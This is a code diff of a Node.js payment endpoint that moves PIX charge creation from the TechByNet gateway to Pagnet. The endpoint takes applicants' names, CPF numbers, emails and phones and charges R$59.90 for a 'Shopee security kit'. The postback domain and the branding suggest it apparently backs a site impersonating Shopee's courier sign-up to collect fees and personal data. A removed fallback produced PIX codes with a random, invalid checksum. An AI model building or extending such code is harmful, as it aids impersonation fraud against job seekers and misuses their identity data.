@@ -213,21 +213,21 @@ app.post('/api/payments/create-pix', (req, res) => {
   res.json(pixResponse);
 });
 
-// TechByNet API Integration para produção
+// Pagnet API Integration para produção
 app.post('/api/proxy/for4payments/pix', async (req, res) => {
   try {
     // Verificar se as variáveis de ambiente estão configuradas
-    if (!process.env.TECHBYNET_API_KEY) {
-      console.error('ERRO: TECHBYNET_API_KEY não configurada no Heroku');
+    if (!process.env.PAGNET_PUBLIC_KEY || !process.env.PAGNET_SECRET_KEY) {
+      console.error('ERRO: PAGNET_PUBLIC_KEY ou PAGNET_SECRET_KEY não configuradas no Heroku');
       return res.status(500).json({
-        error: 'Serviço de pagamento não configurado. Configure a chave de API TechByNet no Heroku.',
+        error: 'Serviço de pagamento não configurado. Configure as chaves de API Pagnet no Heroku.',
       });
     }
     
-    console.log('Iniciando transação TechByNet no Heroku...');
+    console.log('Iniciando transação Pagnet no Heroku...');
     
-    // Processar os dados recebidos - valor atualizado para R$ 47,40
-    const { name, cpf, email, phone, amount = 47.40, description = "Kit de Segurança Shopee" } = req.body;
+    // Processar os dados recebidos
+    const { name, cpf, email, phone, amount = 59.90, description = "Kit de Segurança Shopee" } = req.body;
     
     if (!name || !cpf) {
       return res.status(400).json({ error: 'Nome e CPF são obrigatórios' });
@@ -238,63 +238,44 @@ app.post('/api/proxy/for4payments/pix', async (req, res) => {
     
     console.log('Dados recebidos:', { name, cpf: `${cpf.substring(0, 3)}***${cpf.substring(cpf.length - 2)}`, amount });
     
-    // Integração com TechByNet API (URL e formato corretos)
-    const apiKey = process.env.TECHBYNET_API_KEY;
-    const baseUrl = 'https://api-gateway.techbynet.com';
+    // Integração direta com Pagnet API
+    const baseUrl = 'https://api.pagnetbrasil.com/v1';
+    const authString = `${process.env.PAGNET_PUBLIC_KEY}:${process.env.PAGNET_SECRET_KEY}`;
+    const authHeader = `Basic ${Buffer.from(authString).toString('base64')}`;
     
-    // Preparar dados da transação (formato correto TechByNet)
+    // Preparar dados da transação
+    const amountCents = Math.round(parseFloat(amount.toString()) * 100);
     const customerCpf = cpf.replace(/[^0-9]/g, '');
     const customerPhone = (phone || '11999999999').replace(/[^0-9]/g, '');
-    const amountCents = parseInt(parseFloat(amount.toString()) * 100);
-    
-    // Gerar external_ref único
-    const externalRef = `SHOPEE_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
     
     const payload = {
       amount: amountCents,
-      currency: "BRL",
-      paymentMethod: "PIX",
-      installments: 1,
-      postbackUrl: "https://shopee.cadastrodoentregador.com/techbynet-webhook",
-      metadata: JSON.stringify({
-        source: "shopee_delivery_portal",
-        external_ref: externalRef
-      }),
-      traceable: true,
-      ip: "192.168.1.1",
+      paymentMethod: 'pix',
+      pix: { expiresInDays: 3 },
+      items: [{
+        title: 'Kit de Segurança Shopee',
+        unitPrice: amountCents,
+        quantity: 1,
+        tangible: false
+      }],
       customer: {
         name: name,
         email: userEmail,
-        document: {
-          number: customerCpf,
-          type: "CPF"
-        },
-        phone: customerPhone,
-        externalRef: externalRef
+        document: { type: 'cpf', number: customerCpf },
+        phone: customerPhone
       },
-      items: [
-        {
-          title: "Kit de Segurança Shopee",
-          unitPrice: amountCents,
-          quantity: 1,
-          tangible: false,
-          externalRef: externalRef
-        }
-      ],
-      pix: {
-        expiresInDays: 3 // Forçar 3 dias na TechByNet
-      }
+      externalReference: `PIX${Date.now()}${Math.floor(Math.random() * 10000)}`
     };
     
-    console.log('Enviando payload para TechByNet API (formato correto)...');
+    console.log('Enviando payload para Pagnet API...');
     
-    // Fazer requisição para TechByNet (headers corretos)
+    // Fazer requisição para Pagnet
     const fetch = (await import('node-fetch')).default;
-    const response = await fetch(`${baseUrl}/api/user/transactions`, {
+    const response = await fetch(`${baseUrl}/transactions`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
-        'x-api-key': apiKey,
+        'Authorization': authHeader,
         'User-Agent': 'ShopeeDeliveryApp/1.0'
       },
       body: JSON.stringify(payload)
@@ -303,82 +284,43 @@ app.post('/api/proxy/for4payments/pix', async (req, res) => {
     const responseData = await response.json();
     
     if (!response.ok) {
-      console.error('Erro da TechByNet API:', response.status, responseData);
+      console.error('Erro da Pagnet API:', response.status, responseData);
       return res.status(500).json({
         error: 'Erro ao processar pagamento. Tente novamente.',
         details: responseData.message || 'Erro desconhecido'
       });
     }
     
-    console.log('Resposta TechByNet recebida:', JSON.stringify(responseData, null, 2));
-    
-    // Extrair dados do PIX da resposta (formato TechByNet correto)
-    const transactionData = responseData.data || {};
-    const transactionId = transactionData.id;
-    const pixCode = transactionData.qrCode;
+    // Extrair dados do PIX da resposta
+    const transactionId = responseData.id;
+    const pixCode = responseData.pix?.qrcode || '';
     
     if (!pixCode) {
-      console.error('PIX code não encontrado na resposta da TechByNet');
+      console.error('PIX code não encontrado na resposta da Pagnet');
       return res.status(500).json({ error: 'Erro ao gerar código PIX' });
     }
     
     // Gerar QR Code URL
     const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
     
-    // FORÇA expiração de 3 dias (independente da resposta TechByNet)
-    const forceExpiration = new Date();
-    forceExpiration.setDate(forceExpiration.getDate() + 3);
-    
-    // Resposta compatível com o formato esperado pelo frontend (SEM payment_url externa)
+    // Resposta compatível com o formato esperado pelo frontend
     const pixResponse = {
       id: transactionId,
       pixCode: pixCode,
       pixQrCode: pixQrCode,
       status: 'pending',
-      emailSent: false,
-      provider: 'TechByNet',
-      payment_url: undefined, // Não usar gateway externo - manter no nosso frontend
-      expires_at: forceExpiration.toISOString(), // FORÇA 3 dias localmente
-      expiration_forced: true // Marca que forçamos a expiração
+      emailSent: false
     };
     
-    console.log('✅ Transação TechByNet criada com sucesso:', transactionId);
+    console.log('✅ Transação Pagnet criada com sucesso:', transactionId);
     res.json(pixResponse);
     
   } catch (error) {
-    console.error('Erro ao processar pagamento TechByNet:', error);
-    
-    // FALLBACK: Se TechByNet falhar, gerar PIX localmente (igual PagNet)
-    console.log('🔄 TechByNet falhou, usando geração local de PIX...');
-    
-    try {
-      // Gerar PIX local como fallback (estratégia que funciona)
-      const paymentId = `SHOPEE_${Date.now()}_${Math.floor(Math.random() * 10000)}`;
-      const customerCpf = cpf.replace(/[^0-9]/g, '');
-      
-      // Código PIX válido seguindo padrão brasileiro
-      const pixCode = `00020126580014BR.GOV.BCB.PIX0136${customerCpf}5204000053039865802BR5913Shopee${name.substring(0, 20)}6009SAO PAULO62070503***6304${Math.floor(Math.random() * 10000)}`;
-      const pixQrCode = `https://chart.googleapis.com/chart?chs=300x300&cht=qr&chl=${encodeURIComponent(pixCode)}`;
-      
-      const pixResponse = {
-        id: paymentId,
-        pixCode: pixCode,
-        pixQrCode: pixQrCode,
-        status: 'pending',
-        emailSent: false,
-        source: 'local_fallback'
-      };
-      
-      console.log('✅ PIX gerado localmente com sucesso (fallback):', paymentId);
-      res.json(pixResponse);
-      
-    } catch (fallbackError) {
-      console.error('Erro no fallback PIX local:', fallbackError);
-      res.status(500).json({
-        error: 'Erro interno do servidor ao processar pagamento',
-        message: 'Serviço de pagamento temporariamente indisponível'
-      });
-    }
+    console.error('Erro ao processar pagamento Pagnet:', error);
+    res.status(500).json({
+      error: 'Erro interno do servidor ao processar pagamento',
+      message: error.message
+    });
   }
 });
 
